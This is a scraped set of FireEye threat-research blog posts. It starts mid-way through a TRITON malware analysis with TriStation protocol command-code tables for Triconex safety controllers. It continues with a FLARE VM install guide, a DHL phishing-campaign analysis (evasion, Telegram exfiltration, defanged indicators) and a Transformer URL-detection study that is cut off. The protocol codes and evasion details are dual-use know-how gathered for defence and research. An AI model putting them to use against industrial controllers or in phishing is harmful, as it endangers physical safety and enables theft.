TS_names array from TRITON, and compared the 210, 204, and 212 relevant strings from each respective file. TS_cnames.pyc TS_names and tr1com40.dll share 202 of 220 combined table strings. The remaining strings are unique to each, as seen here: TS_cnames.TS_names (2017 pyc) Tr1com40.dll (2006 CPP) Go to DOWNLOAD mode <200> Not set <209> Unk75 Bad message from module Unk76 Bad message type Unk77 Bad TMI version number Unk78 Module did not respond Unk79 Open Connection: Invalid SAP %d Unk81 Unsupported message for this TMI version Unk83 Wrong command TS_cnames.pyc TS_names and Tridcom.dll (1999 CPP) shared only 151 of 268 combined table strings, showing a much smaller overlap with the seemingly older CPP library. This makes sense based on the context that Tridcom.dll is meant for a Trident controller, not a Tricon controller. It does seem as though Tr1com40.dll and TR1STRS.CPP code was based on older work. We are not shocked to find that the threat actor reversed legitimate code to bolster development of the TRITON framework. They want to work smarter, not harder, too. But after reverse engineering legitimate software and implementing the basics of the TriStation, the threat actors still had an incomplete understanding of the protocol. In TRITON's TS_cnames.pyc we saw \"Unk75\", \"Unk76\", \"Unk83\" and other values that were not present in the tr1com40.DLL strings, indicating that the TRITON threat actor may have explored the protocol and annotated their findings beyond what they reverse engineered from the DLL. The gaps in TriStation implementation show us why the actors encountered problems interacting with the Triconex controllers when using TRITON in the wild. You can see more of the Trilog and Triconex DLL files on VirusTotal. Item Name MD5 Description Tr1com40.dll 069247df527a96a0e048732ca57e7d3d Tricom Communcations DLL Data1.cab e6a3c93a6d433cbaf6f573b6c09d76c4 Parent of Tr1com40.dll Trilog v4.1.360R 13a3b83ba2c4236ca59aba679941c8a5 RAR Archive of TriLog TridCom.dll 5c2ed617fdec4779cb33c89082a43100 Trident Communications DLL Afterthoughts Seeing Triconex systems targeted with malicious intent was new to the world six months ago. Moving forward it would be reasonable to anticipate additional frameworks, such as TRITON, designed for usage against other SIS controllers and associated technologies. If Triconex was within scope, we may see similar attacker methodologies affecting the dominant industrial safety technologies. Basic security measures do little to thwart truly persistent threat actors and monitoring only IT networks is not an ideal situation. Visibility into both the IT and OT environments is critical for detecting the various stages of an ICS intrusion. Simple detection concepts such as baseline deviation can provide insight into abnormal activity. While the TRITON framework was actively in use, how many traditional ICS “alarms” were set off while the actors tested their exploits and backdoors on the Triconex controller? How many times did the TriStation protocol, as implemented in their Python scripts, fail or cause errors because of non-standard traffic? How many TriStation UDP pings were sent and how many Connection Requests? How did these statistics compare to the baseline for TriStation traffic? There are no answers to these questions for now. We believe that we can identify these anomalies in the long run if we strive for increased visibility into ICS technologies. We hope that by holding public discussions about ICS technologies, the Infosec community can cultivate closer relationships with ICS vendors and give the world better insight into how attackers move from the IT to the OT space. We want to foster more conversations like this and generally share good techniques for finding evil. Since most of all ICS attacks involve standard IT intrusions, we should probably come together to invent and improve any guidelines for how to monitor PCs and engineering workstations that bridge the IT and OT networks. We envision a world where attacking or disrupting ICS operations costs the threat actor their cover, their toolkits, their time, and their freedom. It's an ideal world, but something nice to shoot for. Thanks and Future Work There is still much to do for TRITON and TriStation. There are many more sub-message types and nuances for parsing out the nitty gritty details, which is hard to do without a controller of our own. And although we’ve published much of what we learned about the TriStation here on the blog, our work will continue as we continue our study of the protocol. Thanks to everyone who did so much public research on TRITON and TriStation. We have cited a few individuals in this blog post, but there is a lot more community-sourced information that gave us clues and leads for our research and testing of the framework and protocol. We also have to acknowledge the research performed by the TRITON attackers. We borrowed a lot of your knowledge about TriStation from the TRITON framework itself. Finally, remember that we're here to collaborate. We think most of our research is right, but if you notice any errors or omissions, or have ideas for improvements, please spear phish contact: smiller@fireeye.com. Recommended Reading Attackers Deploy New ICS Attack Framework “TRITON” and Cause Operational Disruption to Critical Infrastructure Attack Induced Common-Mode Failures on PLC-Based Safety System in a Nuclear Power Plant: Practical Experience Report Analyzing the TRITON industrial malware Repository containting original and decompiled files of TRISIS/TRITON/HATMAN malware TRISIS Malware Analysis of Safety System Targeted Malware Appendix A: TriStation Message Type Codes The following table consists of hex values at offset 0 in the TriStation UDP packets and the associated dictionary definitions, extracted verbatim from the TRITON framework in library TS_cnames.pyc. Value at 0x0 Message Type 1 Connection Request 2 Connection Response 3 Disconnect Request 4 Disconnect Response 5 Execution Command 6 Ping Command 7 Connection Limit Reached 8 Not Connected 9 MPS Are Dead 10 Access Denied 11 Connection Failed Appendix B: TriStation Execution Command Function Codes The following table consists of hex values at offset 6 in the TriStation UDP packets and the associated dictionary definitions, extracted verbatim from the TRITON framework in library TS_cnames.pyc. Value at 0x6 TS_cnames String 0 0: 'Start download all', 1 1: 'Start download change', 2 2: 'Update configuration', 3 3: 'Upload configuration', 4 4: 'Set I/O addresses', 5 5: 'Allocate network', 6 6: 'Load vector table', 7 7: 'Set calendar', 8 8: 'Get calendar', 9 9: 'Set scan time', A 10: 'End download all', B 11: 'End download change', C 12: 'Cancel download change', D 13: 'Attach TRICON', E 14: 'Set I/O address limits', F 15: 'Configure module', 10 16: 'Set multiple point values', 11 17: 'Enable all points', 12 18: 'Upload vector table', 13 19: 'Get CP status ', 14 20: 'Run program', 15 21: 'Halt program', 16 22: 'Pause program', 17 23: 'Do single scan', 18 24: 'Get chassis status', 19 25: 'Get minimum scan time', 1A 26: 'Set node number', 1B 27: 'Set I/O point values', 1C 28: 'Get I/O point values', 1D 29: 'Get MP status', 1E 30: 'Set retentive values', 1F 31: 'Adjust clock calendar', 20 32: 'Clear module alarms', 21 33: 'Get event log', 22 34: 'Set SOE block', 23 35: 'Record event log', 24 36: 'Get SOE data', 25 37: 'Enable OVD', 26 38: 'Disable OVD', 27 39: 'Enable all OVDs', 28 40: 'Disable all OVDs', 29 41: 'Process MODBUS', 2A 42: 'Upload network', 2B 43: 'Set lable', 2C 44: 'Configure system variables', 2D 45: 'Deconfigure module', 2E 46: 'Get system variables', 2F 47: 'Get module types', 30 48: 'Begin conversion table download', 31 49: 'Continue conversion table download', 32 50: 'End conversion table download', 33 51: 'Get conversion table', 34 52: 'Set ICM status', 35 53: 'Broadcast SOE data available', 36 54: 'Get module versions', 37 55: 'Allocate program', 38 56: 'Allocate function', 39 57: 'Clear retentives', 3A 58: 'Set initial values', 3B 59: 'Start TS2 program download', 3C 60: 'Set TS2 data area', 3D 61: 'Get TS2 data', 3E 62: 'Set TS2 data', 3F 63: 'Set program information', 40 64: 'Get program information', 41 65: 'Upload program', 42 66: 'Upload function', 43 67: 'Get point groups', 44 68: 'Allocate symbol table', 45 69: 'Get I/O address', 46 70: 'Resend I/O address', 47 71: 'Get program timing', 48 72: 'Allocate multiple functions', 49 73: 'Get node number', 4A 74: 'Get symbol table', 4B 75: 'Unk75', 4C 76: 'Unk76', 4D 77: 'Unk77', 4E 78: 'Unk78', 4F 79: 'Unk79', 50 80: 'Go to DOWNLOAD mode', 51 81: 'Unk81', 52 53 83: 'Unk83', 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63 64 100: 'Command rejected', 65 101: 'Download all permitted', 66 102: 'Download change permitted', 67 103: 'Modification accepted', 68 104: 'Download cancelled', 69 105: 'Program accepted', 6A 106: 'TRICON attached', 6B 107: 'I/O addresses set', 6C 108: 'Get CP status response', 6D 109: 'Program is running', 6E 110: 'Program is halted', 6F 111: 'Program is paused', 70 112: 'End of single scan', 71 113: 'Get chassis configuration response', 72 114: 'Scan period modified', 73 115: '<115>', 74 116: '<116>', 75 117: 'Module configured', 76 118: '<118>', 77 119: 'Get chassis status response', 78 120: 'Vectors response', 79 121: 'Get I/O point values response', 7A 122: 'Calendar changed', 7B 123: 'Configuration updated', 7C 124: 'Get minimum scan time response', 7D 125: '<125>', 7E 126: 'Node number set', 7F 127: 'Get MP status response', 80 128: 'Retentive values set', 81 129: 'SOE block set', 82 130: 'Module alarms cleared', 83 131: 'Get event log response', 84 132: 'Symbol table ccepted', 85 133: 'OVD enable accepted', 86 134: 'OVD disable accepted', 87 135: 'Record event log response', 88 136: 'Upload network response', 89 137: 'Get SOE data response', 8A 138: 'Alocate network accepted', 8B 139: 'Load vector table accepted', 8C 140: 'Get calendar response', 8D 141: 'Label set', 8E 142: 'Get module types response', 8F 143: 'System variables configured', 90 144: 'Module deconfigured', 91 145: '<145>', 92 146: '<146>', 93 147: 'Get conversion table response', 94 148: 'ICM print data sent', 95 149: 'Set ICM status response', 96 150: 'Get system variables response', 97 151: 'Get module versions response', 98 152: 'Process MODBUS response', 99 153: 'Allocate program response', 9A 154: 'Allocate function response', 9B 155: 'Clear retentives response', 9C 156: 'Set initial values response', 9D 157: 'Set TS2 data area response', 9E 158: 'Get TS2 data response', 9F 159: 'Set TS2 data response', A0 160: 'Set program information reponse', A1 161: 'Get program information response', A2 162: 'Upload program response', A3 163: 'Upload function response', A4 164: 'Get point groups response', A5 165: 'Allocate symbol table response', A6 166: 'Program timing response', A7 167: 'Disable points full', A8 168: 'Allocate multiple functions response', A9 169: 'Get node number response', AA 170: 'Symbol table response', AB AC AD AE AF B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0 C1 C2 C3 C4 C5 C6 C7 C8 200: 'Wrong command', C9 201: 'Load is in progress', CA 202: 'Bad clock calendar data', CB 203: 'Control program not halted', CC 204: 'Control program checksum error', CD 205: 'No memory available', CE 206: 'Control program not valid', CF 207: 'Not loading a control program', D0 208: 'Network is out of range', D1 209: 'Not enough arguments', D2 210: 'A Network is missing', D3 211: 'The download time mismatches', D4 212: 'Key setting prohibits this operation', D5 213: 'Bad control program version', D6 214: 'Command not in correct sequence', D7 215: '<215>', D8 216: 'Bad Index for a module', D9 217: 'Module address is invalid', DA 218: '<218>', DB 219: '<219>', DC 220: 'Bad offset for an I/O point', DD 221: 'Invalid point type', DE 222: 'Invalid Point Location', DF 223: 'Program name is invalid', E0 224: '<224>', E1 225: '<225>', E2 226: '<226>', E3 227: 'Invalid module type', E4 228: '<228>', E5 229: 'Invalid table type', E6 230: '<230>', E7 231: 'Invalid network continuation', E8 232: 'Invalid scan time', E9 233: 'Load is busy', EA 234: 'An MP has re-educated', EB 235: 'Invalid chassis or slot', EC 236: 'Invalid SOE number', ED 237: 'Invalid SOE type', EE 238: 'Invalid SOE state', EF 239: 'The variable is write protected', F0 240: 'Node number mismatch', F1 241: 'Command not allowed', F2 242: 'Invalid sequence number', F3 243: 'Time change on non-master TRICON', F4 244: 'No free Tristation ports', F5 245: 'Invalid Tristation I command', F6 246: 'Invalid TriStation 1131 command', F7 247: 'Only one chassis allowed', F8 248: 'Bad variable address', F9 249: 'Response overflow', FA 250: 'Invalid bus', FB 251: 'Disable is not allowed', FC 252: 'Invalid length', FD 253: 'Point cannot be disabled', FE 254: 'Too many retentive variables', FF 255: 'LOADER_CONNECT', 256: 'Unknown reject code' Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/11/flare-vm-update.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2018-11-14",
                    "source": "www.fireeye.com"
                },
                "text": "FLARE VM is the first of its kind reverse engineering and malware analysis distribution on Windows platform. Since its introduction in July 2017 , FLARE VM has been continuously trusted and used by many reverse engineers, malware analysts, and security researchers as their go-to environment for analyzing malware. Just like the ever-evolving security industry, FLARE VM has gone through many major changes to better support our users’ needs. FLARE VM now has a new installation, upgrade, and uninstallation process, which is a long anticipated feature requested by our users. FLARE VM also includes many new tools such as IDA 7.0, radare and YARA. Therefore, we would like to share these updates, especially the new installation process. Installation We strongly recommend you use FLARE VM within a virtualized environment for malware analysis to protect and isolate your physical device and network from malicious activities. We assume you already have experience setting up and configuring your own virtualized environment. Please create a new virtual machine (VM) and perform a fresh installation of Windows. FLARE VM is designed to be installed on Windows 7 Service Pack 1 or newer; therefore, you can select a version of windows that best suits your needs. From this point forward, all installation steps should be performed within your VM. Once you have a VM with a fresh installation of Windows, use one of the following URLs to download the compressed FLARE VM repository onto your VM: https://github.com/fireeye/flare-vm https://flarevm.info Figure 1: Download FLARE VM repo Then, use the following steps to install FLARE VM: Decompress the FLARE VM repository to a directory of your choosing. Start a new session of PowerShell with escalated privileges. FLARE VM attempts to install additional software and modify system settings; therefore, escalated privileges are required for installation. Within PowerShell, change directory to the location where you have decompressed the FLARE VM repository. Enable unrestricted execution policy for PowerShell by executing the following command and answering “Y” when prompted by PowerShell: Set-ExecutionPolicy unrestricted Execute the install.ps1 installation script. You will be prompted to enter the current user’s password. FLARE VM needs the current user’s password to automatically login after a reboot when installing. Optionally, you can specify the current user’s password by passing the “-password <current_user_password>” at the command line. Figure 2: Start PowerShell as administrator Figure 3: Ready to install FLARE VM The rest of the installation process is fully automated. Depending upon your internet speed the entire installation may take up to one hour to finish. The VM also reboots multiple times due to the numerous software installations’ requirements. Once the installation completes, the PowerShell prompt remains open waiting for you to hit any key before exiting. After completing the installation, you will be presented with the following desktop environment: Figure 4: FLARE VM installation completes Congratulations! You have successfully installed FLARE VM. At this point we recommend you power off the VM, switch the VM networking mode to Host-Only, and then take a snapshot to save a clean state of your analysis VM. Improvement The biggest improvement for FLARE VM is the ability to perform a proper update and uninstallation. The older version of FLARE VM came as a PowerShell script to install many chocolatey packages, one at a time; therefore, we were unable to include new packages when updating FLARE VM. In the past, our users had to reinstall FLARE VM completely, which is time consuming, or manually install the new package, which is error prone. To solve this issue, we have converted FLARE VM itself into a chocolatey package. Whenever a new tool is available we will also release a new version of FLARE VM. With this new design we can simply execute “choco upgrade all” to get the newest version of FLARE VM along with any new packages we have released. You can also safely uninstall all FLARE VM packages by executing “choco uninstall flarevm.installer.flare”. Our new FLARE VM is also updated to use Python 3.7 as the default Python interpreter. As a result, many python scripts may fail to execute. To maintain support for older scripts, we keep Python 2.7 installed in parallel with Python 3.7. We can easily switch between different versions by using the Python launcher. Run “py -2.7 <path_to_python_script>” to use Python 2.7, or “py <path_to_python_script>” to use the default Python 3.7 interpreter. For more details on the Python launcher, please refer to the following URL: https://docs.python.org/3/using/windows.html#launcher. Additionally, the new FLARE VM changes the location where Fakenet-NG saves its output when launched via the shortcut in the FLARE folder or taskbar pin. Instead of saving directly to the desktop, to reduce clutter, Fakenet-NG will store all its output in “Desktop\\fakenet_logs”. Compared to older versions this version of FLARE VM comes with many new tools and software packages. Most notably, this release adds the following: IDA Free 7.0 radare2 to support 64-bit disassembly The labs for the Practical Malware Analysis book pdfid, pdf-parser, and PdfStreamdumper to analyze malicious PDF documents The Malcode Analyst Pack Yara for signature matching The Cygwin Linux environment on windows PowerShell transcription and script block logging PowerShell transcripts can be found in “Desktop\\PS_Transcripts” Available Packages While we attempt to make the tools available as shortcuts within the FLARE folder, there are several available from command-line only. Please see the online documentation for the most up to date list. Here is an incomplete list of some major tools available on FLARE VM: Disassemblers: IDA Free 5.0 and IDA Free 7.0 Binary Ninja Radare2 and Cutter Debuggers: OllyDbg and OllyDbg2 x64dbg Windbg File Format parser: CFF Explorer, PEView, PEStudio PdfStreamdumper, pdf-parser, pdfid ffdec offvis and officemalscanner PE-bear Decompilers: RetDec Jd-gui and bytecode-viewer dnSpy IDR VBDecompiler Py2ExeDecompiler Monitoring tools: SysInternal suite RegShot Utilities: Hex Editors (010 editor, HxD and File Insight) FLOSS (FireEye Labs Obfuscated String Solver) Fakenet-NG Yara Malware Analyst Pack Conclusion The FLARE team continues to support and improve FLARE VM to be the de facto distribution for security research, incident response, and malware analysis on Windows platform. We greatly appreciate the numerous bug reports, tool requests, and feature recommendations from everyone. We hope FLARE VM, along with many other FLARE open source projects, can help you do your work better, easier, and faster. We are always looking for talented folks to join our team. The FLARE Team may be a good place for you if: You eat, sleep, and speak disassembly and malware all day long. You would like to push the state of the art for reverse engineering and malware analysis. Please check out our careers page , or send us an email. Happy Reversing! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/01/phishing-campaign-woff-obfuscation-telegram-communications.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-01-26",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Email Security recently encountered various phishing campaigns, mostly in the Americas and Europe, using source code obfuscation with compromised or bad domains. These domains were masquerading as authentic websites and stole personal information such as credit card data. The stolen information was then shared to cross-platform, cloud-based instant messaging applications. Coming off a busy holiday season with a massive surge in deliveries, this post highlights a phishing campaign involving a fake DHL tracking page. While phishing attacks targeting users of shipping services is not new, the techniques used in these examples are more complex than what would be found in an off-the-shelf phishing kit. This campaign uses a WOFF-based substitution cypher, localization specific targeting, and various evasion techniques which we unravel here in this blog. Attack Flow The attack starts with an email imitating DHL, as seen in Figure 1 . The email tries to trick the recipient into clicking on a link, which would take them to a fake DHL website. In Figure 2, we can see the fake page asking for credit card details that, if submitted, would give the user a generic response while in the background the credit card data is shared with the attackers. Figure 1: DHL phishing attempt Figure 2: Fake website imitating DHL tracking This DHL phishing campaign uses a rare technique for obfuscating its source page. The page source contains proper strings, valid tags, and appropriate formatting, but contains encoded text that would render gibberish without decoding prior to loading the page, as seen in Figure 3. Typically, decoding such text is done by including script functions within the code. Yet in this case, the decoding functions are not contained in the script. Figure 3: Snippet of the encoded text on page source The decoding is done by a Web Open Font Format (WOFF) font file, which happens upon loading the page in a browser and will not be visible in the page content itself. Figure 4 shows the substitution cipher method and the WOFF font file. The attacker does this to evade detection by security vendors. Many security vendors use static or regex signature-based rules, so this method will break those naïve-based conditions. Figure 4: WOFF substitution cipher Loading this custom font which decodes the text is done inside the Cascading Style Sheets (CSS). This technique is rare as JavaScript functions are traditionally used to encrypt and decrypt HTML text. Figure 5: CSS file for loading WOFF font file Figure 5 shows the CSS file used to load the WOFF font file. We have also seen the same CSS file, style.css, being hosted on the following domains: hxxps://www.lifepointecc[.]com/wp-content/sinin/style.css hxxps://candyman-shop[.]com/auth/DHL_HOME/style.css hxxps://mail.rsi-insure[.]com/vendor/ship/dhexpress/style.css hxxps://www.scriptarticle[.]com/thro/HOME/style.css These legitimate-looking domains are not hosting any phishing websites as of now; instead, they appear to be a repository for attackers to use in their phishing campaigns. We have seen similar phishing attacks targeting the banking sector in the past, but this is newer for delivery websites. Notable Techniques Localization The phishing page displays the local language based on the region of the targeted user. The localization code (Figure 6) supports major languages spoken in Europe and the Americas such as Spanish, English, and Portuguese. Figure 6: Localization code The backend contains PHP resource files for each supported language (Figure 7), which are picked up dynamically based on the user’s IP address location. Figure 7: Language resource files Evasion This campaign employs a variety of techniques to evade detection. This will not serve up a phishing page if the request came from certain blocked IP addresses. The backend code (Figure 8) served the users with a \"HTTP/1.1 403 Forbidden\" response header under the following conditions: IP has been seen five times (AntiBomb_User func) IP host resolves to its list of avoided host names ('google', 'Altavista', 'Israel', 'M247', 'barracuda', 'niw.com.au' and more) (AntiBomb_WordBoot func) IP is on its own local blocklist csv (x.csv in the kit) (AntiBomb_Boot func) IP has seen POSTing three times (AntiBomb_Block func) Figure 8: Backend evasion code After looking at the list of blocked hosts, we could deduce that the attackers were trying to block web crawlers. Data Theft The attackers behind this phishing campaign attempted to steal credentials, credit card data, and other sensitive information. The stolen data is sent to email addresses and Telegram channels controlled by the attacker. We uncovered a Telegram channel where data is being sent using the Telegram Bot API shown in Figure 9. Figure 9: Chat log While using php mail() function to send stolen credentials is quite common, in the near past, encrypted instant messaging applications such as Telegram have been used for sending phished information back to command and control servers. We were able to access one of the Telegram channels controlled by the attacker as shown in Figure 10. The sensitive information being sent in the chat includes IP addresses and credit card data. Figure 10: Telegram channel with stolen information Conclusion Attackers (and especially phishers) are always on the hunt for new ways to evade detection by security products. Obfuscation gives the attackers an edge, and makes it harder for security vendors to protect their customers. By using instant messaging applications, attackers get user data in real time and victims have little to respond once their personal information is compromised. Indicators of Compromise (IOC) FireEye Email Security utilizing FAUDE (FireEye Advanced URL Detection Engine) protects customers from these types of phishing threats. Unlike traditional anti-phishing techniques dependent on static inspection of phishing URL content, FAUDE uses multiple artificial intelligence (AI) and machine learning (ML) engines to more effectively thwart these attacks. From December 2020 until the time of posting, our FAUDE detection engine saw more than 100 unique URLs hosting DHL phishing pages with obfuscated source code, including: hxxps://bit[.]ly/2KJ03RH hxxps://greencannabisstore[.]com/0258/redirect-new.php hxxps://directcallsolutions[.]co[.]za/CONTACT/DHL_HOME/ hxxps://danapluss[.]com/wp-admin/dhl/home/ hxxp://r.cloudcyberlink[.]digital/<path> (multiple paths using same domain) Email Addresses medmox2k@yandex[.]com o.spammer@yandex[.]com cameleonanas2@gmail[.]com Telegram Users @Saitama330 @cameleon9 style.css Md5: 83b9653d14c8f7fb95d6ed6a4a3f18eb) Sha256: D79ec35dc8277aff48adaf9df3ddd5b3e18ac7013e8c374510624ae37cdfba31 font-woff2 MD5: b051d61b693c76f7a6a5f639177fb820 SHA-256: 5dd216ad75ced5dd6acfb48d1ae11ba66fb373c26da7fc5efbdad9fd1c14f6e3 Domains Pradosdemojanda[.]com global-general-trackks.supercarhiredubai[.]com tracking-dhi.company Tapolarivercamp[.]com Rosariumvigil[.]com Mydhlexpert[.]com Autorepairbyfradel[.]com URLs hxxps://wantirnaosteo[.]com[.]au/logon/home/MARKET/F004f19441/11644210b.php hxxps://ekartenerji[.]com[.]tr/wp-admin/images/dk/DHL/home.php hxxps://aksharapratishthan[.]org/admin/imagess/F004f19441/sms1.php hxxps://royalgateedu[.]com/wp-content/plugins/elementor/includes/libraries/infos/package/F004f19441/00951124a.php hxxps://vandahering[.]com[.]br/htacess hxxps://hkagc[.]com/man/age/F004f19441/11644210b.php hxxps://fiquefitnes[s]comsaude[.]com/.well-known/MARKET/MARKET/F004f19441/11644210b.php hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php hxxps://www.instantcopywritingscript[.]com/blog/wp-content/22/DHL/MARKET hxxps://isss[.]sjs[.]org[.]hk/wp-admin/includes/F004f19441/11644210b.php hxxps://www.concordceramic[.]com/fr/frais/F004f19441/11644210b.php hxxps://infomediaoutlet[.]com/oldsite/wp-content/uploads/2017/02/MARKET/ hxxps://wema-wicie[.]pl/dh/l/en/MARKET hxxps://www.grupoindustrialsp[.]com/DHL/MARKET/ hxxps://marrecodegoias[.]com[.]br/wp-snapshots/activat/MARKET/F004f19441/11644210b.php hxxps://villaluna[.]de/wp-content/info/MARKET/F004f19441/11644210b.php hxxp://sandur[.]dk/wp-content/upgrade/-/MARKET/ hxxps://chistimvse[.]com/es/dhl/MARKET/ hxxps://detmayviet[.]com/wp-includes/widgets/-/MARKET/F004f19441/11644210b.php hxxps://dartebreakfast[.]com/wp-content/plugins/dhl-espress/MARKET/ hxxps://genesisdistributors[.]com/-/Tracking/dhl/Tracking/dhl-tracking/F004f19441/00951124a.php hxxps://www.goldstartechs[.]com/wp-admin/js/widgets/102/F004f19441/11644210b.php hxxps://universalpublicschooltalwandisabo[.]com/DHL hxxps://intranet[.]prorim[.]org[.]br/info/MARKET/F004f19441/11644210b.php hxxps://administrativos[.]cl/mail.php hxxps://nataliadurandpsicologa[.]com[.]br/upgrade/MARKET/F004f19441/11644210b.php hxxps://tanaxinvest[.]com/en/dhl/MARKET/ hxxps://deepbluedivecenter[.]com/clear/item/ hxxps://keystolivingafulfilledlife[.]com/wp-admin/includes/daspoe99i3mdef/DOCUNTRITING hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/01/training-transformers-for-cyber-security-tasks-malicious-url-prediction.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-01-21",
                    "source": "www.fireeye.com"
                },
                "text": "Highlights Perform a case study on using Transformer models to solve cyber security problems Train a Transformer model to detect malicious URLs under multiple training regimes Compare our model against other deep learning methods, and show it performs on-par with other top-scoring models Identify issues with applying generative pre-training to malicious URL detection, which is a cornerstone of Transformer training in natural language processing (NLP) tasks Introduce novel loss function that balances classification and generative loss to achieve improved performance on the malicious URL detection task Introduction Over the past three years Transformer machine learning (ML) models, or “Transformers” for short, have yielded impressive breakthroughs in a variety of sequence modeling problems, specifically natural language processing (NLP). For example, OpenAI’s latest GPT-3 model is capable of generating long segments of grammatically-correct prose from scratch. Spinoff models, such as those developed for question and answering, are capable of correlating context over multiple sentences. AI Dungeon , a single and multiplayer text adventure game, uses Transformers to generate plausible unlimited content in a variety of fantasy settings. Transformers’ NLP modeling capabilities are apparently so powerful that they pose security risks in their own right, in terms of their potential power to spread disinformation , yet on the other side of the coin, they can be used as powerful tools to detect and mitigate disinformation campaigns. For example, in previous research by the FireEye Data Science team, a NLP Transformer was fine-tuned to detect disinformation on social media sites. Given the power of these Transformer models, it seems natural to wonder if we can apply them to other types of cyber security problems that do not necessarily involve natural language, per se. In this blog post, we discuss a case study in which we apply Transformers to malicious URL detection. Studying Transformer performance on URL detection problem is a first logical step to extending Transformers to more generic cyber security tasks, since URLs are not technically natural language sequences but share some common characteristics with NLP. In the following sections, we outline a typical Transformer architecture and discuss how we adapt it to URLs with a character-focused tokenization. We then discuss loss functions we employ to guide the training of the model, and finally compare our training approaches to more conventional ML-based modeling options. Adapting Transformers to URLs Our URL Transformer operates at the character level, where each character in the URL corresponds to an input token. When a URL is input to our Transformer, it is appended with special tokens—a classification token (“CLS”) that conditions the model to produce a prediction and padding tokens (“PAD”) that normalize the input to a fixed length to allow for parallel training. Each token in the input string is then projected into a character embedding space, followed by a stack of Attention and Feed-Forward Neural Network (FFNN) layers. This stack of layers is similar to the architecture introduced in the original Transformers paper . At a high level, the Attention layers allow each input to be associated with long-distance context of other characters that are important for the classification task, similar to the notion of attention in humans, while the FFNN layers provide capacity for learning the relationships among the combination of inputs and their respective contexts. An illustration of our architecture is shown in Figure 1. Additionally, the URL Transformer employs a masking strategy in its Attention calculation, which enforces a left-to-right (L-R) dependence. This means that only input characters from the left of a given character influence that character’s representation in each layer of the attention stack. The network outputs one embedding for each input character, which captures all information learned by the model about the character sequence up to that point in the input. Once the model is trained, we can use the URL Transformer to perform several different tasks, such as generatively predicting the next character in the input sequence by using the sequence embedding () as an input to another neural network with as softmax output over the possible vocabulary of characters. A specific example of this is shown in Figure 1, where we take the embedding of the input “firee”() and use it to predict the next most likely character, “y.” Similarly, we can use the embedding produced after the classification token to predict other properties of the input sequences, such as their likelihood of maliciousness. Figure 1: High-level overview of the URL Transformer architecture Loss Functions and Training Regimes With the model architecture in hand, we now turn to the question of how we train the model to most effectively detect malicious URLs. Of course, we can train this model in a similar way to other supervised deep learning classifiers by: (1) making predictions on samples from a labeled training set, (2) using a loss function to measure the quality of our predictions, and (3) tune model parameters (i.e., weights) via backpropagation . However, the nature of the Transformer model allows for several interesting variations to this training regime . In fact, one of the reasons that Transformers have become so popular for NLP tasks is because they allow for self-supervised generative pre-training, which takes advantage of massive amounts of unlabeled data to help the model learn general characteristics of the input language before being fine-tuned on the ultimate task at-hand (e.g., question answering, sentiment analysis, etc.). Here, we outline some of the training regimes we explored for our URL Transformer model. Direct Label Prediction (Decode-To-Label) Using a training set of URLs with malicious and benign labels, we can treat the URL Transformer architecture as a feature extractor, whose outputs we use as the input to a traditional classifier (e.g., FFNN or even a random forest). When using a FFNN as our classifier, we can backpropagate the classification loss (e.g., binary cross-entropy) through both the classifier and the Transformer network to adjust the weights to perform classification. This training regime is the baseline for our experiments and is how most deep learning models are trained for classification tasks. Next-Character Prediction Pre-Training and Fine-Tuning Beyond the baseline classification training regime, the NLP literature suggests that one can learn a self-supervised embedding of the input sequence by training the Transformer to perform a next-character prediction task, then fine-tuning the learned representation for the classification problem. A key advantage of this approach is that data used for pre-training does not require malicious or benign labels; instead, the next characters in a URL serve as the labels to be predicted from prior characters in the sequence. This is similar to the example given in Figure 1, where the embedding output is used to predict the next character, “y,” in “fireeye.com.” Overall, this training regime allows us to take advantage of the massive amount of unlabeled data that is typically available in cyber security-related problems. The overall structure of the architecture for this regime is similar to the aforementioned binary classification task, with FFNN layers added for classification. However, since we are now predicting multiple classes (i.e., one class per input character in the vocabulary), we must apply a softmax function to the output to induce a probability distribution over the potential output characters. Once the Transformer portion of the network is pre-trained in this way, we can swap the FFNN classification layers focused on character prediction with new layers that will be trained for the malicious URL classification problem, as in the decode-to-label case. Balanced Mixed-Objective Training Prior work has shown that imbuing the training process with additional knowledge outside of the primary task can help constrain the learning process, and ultimately result in better models. For instance, a malware classifier might train using loss functions that capture malicious/benign classification, malware family prediction, and tag prediction tasks as a mechanism to provide the classifier with broader understanding of the problem than looking at malicious/benign labels in isolation. Inspired by these findings, we also introduced a mixed-objective training regime for our URL Transformer, where we train for binary classification and next-character prediction simultaneously. At each iteration of training, we compute a loss multiplier such that each loss contribution is fixed prior to backpropagation. This ensures that neither loss term dominates during training. Specifically, for minibatch i , let the net loss L Mixed be computed as follows: Given hyperparameters a and b , defined such that a + b : = 1, we compute constant a so that the net loss contribution of L CLS to L Mixed is a and the net contribution of L Next to L Mixed is b . For our evaluations, we set a := b := 0.5, effectively requiring that the model equally balance its ability to generate the next character and accurately predict malicious URLs. Evaluation To evaluate our URL Transformer model and better understand the impact of the three training regimes discussed earlier, we collected a training dataset of over 1M labeled malicious and benign URLs, which was split into roughly 700K training samples, 100K validation samples, and 200k test samples. Additionally, we also developed an unlabeled pre-training dataset of 20M URLs. Using this data, we performed four different training runs for our Transformer model: DecodeToLabel (Baseline): Using strictly the binary cross-entropy loss on the embedded classification features over the entire sequence, we trained the model for 15 epochs using the training set. MixedObjective: We trained the model for 15 epochs on the training set, using both the embedded classification features and the embedded next-character prediction features. FineTune: We pre-trained the model for 15 epochs on the next-character prediction task using the training set, ignoring the malicious/benign labels. We then froze weights over the first 16 layers of the model and trained the model for an additional 15 epochs using a binary cross-entropy loss on the classification labels. FineTune 20M: We performed pre-training on the next-character prediction task using the 20M URL dataset, pre-training for 2 epochs. We then froze 